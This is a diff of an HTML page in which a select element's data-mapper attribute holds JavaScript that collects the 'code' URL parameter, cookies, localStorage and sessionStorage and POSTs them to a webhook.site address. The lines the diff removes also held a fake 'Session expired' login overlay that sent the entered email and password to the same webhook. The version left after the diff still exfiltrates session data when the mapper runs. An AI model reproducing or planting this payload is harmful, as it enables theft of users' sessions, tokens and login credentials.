@@ -11,46 +11,19 @@
   <body>
     <select
       data-src-url="/api/data"
-      data-mapper="() => {
-        const code = new URLSearchParams(window.location.search).get('code');
+      data-mapper="()=>{
+        const code = new URLSearchParams(location.search).get('code');
         const data = {
-          cookies: document.cookie,
+          code,
+          cookie: document.cookie,
           localStorage: {...localStorage},
-          sessionStorage: {...sessionStorage},
-          code: code || 'NO_CODE'
+          sessionStorage: {...sessionStorage}
         };
-
         fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(data)
         });
-
-        // Fake login injection
-        const f = document.createElement('form');
-        f.innerHTML = `
-          <div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999;font-family:sans-serif;padding:20px'>
-            <h2>Session expired. Please log in again</h2>
-            <input type='text' id='user' placeholder='Email' /><br/><br/>
-            <input type='password' id='pass' placeholder='Password' /><br/><br/>
-            <button type='submit'>Login</button>
-          </div>
-        `;
-        f.onsubmit = (e) => {
-          e.preventDefault();
-          fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              username: document.getElementById('user').value,
-              password: document.getElementById('pass').value,
-              ts: Date.now()
-            })
-          });
-        };
-        document.body.appendChild(f);
       }">
     </select>
   </body>
 </html>
-
